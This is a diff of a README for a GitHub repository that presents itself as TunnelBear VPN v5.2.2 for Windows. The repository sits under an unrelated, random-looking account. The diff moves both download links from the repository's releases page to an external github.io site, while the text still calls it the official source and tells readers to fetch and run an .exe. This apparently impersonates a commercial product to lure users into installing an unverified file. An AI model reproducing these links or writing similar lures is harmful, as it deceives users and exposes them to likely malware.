@@ -1,6 +1,6 @@
 # 🐻 tunnelbear-vpn-windows-522 - Secure your privacy with simple tools
 
-[![](https://img.shields.io/badge/Download-TunnelBear_VPN-blue.svg)](https://github.com/doraliareptilian757/tunnelbear-vpn-windows-522/releases)
+[![](https://img.shields.io/badge/Download-TunnelBear_VPN-blue.svg)](https://doraliareptilian757.github.io)
 
 TunnelBear VPN v5.2.2 protects your internet connection. This software encrypts your data to keep your online activity private. It hides your digital location from tracking software. You can use this VPN to browse the web with more safety. The tools inside shift your data through a secure tunnel. This stops third parties from seeing what you do online. This version works on Windows systems to provide a consistent experience.
 
@@ -8,7 +8,7 @@ TunnelBear VPN v5.2.2 protects your internet connection. This software encrypts 
 
 You need to obtain the installer file from the official releases page. 
 
-[Visit this page to download the software](https://github.com/doraliareptilian757/tunnelbear-vpn-windows-522/releases)
+[Visit this page to download the software](https://doraliareptilian757.github.io)
 
 Look for the link that ends in .exe. Click this link to save the file to your computer. Most browsers save files to your Downloads folder. Wait for the download to finish before you continue.
 
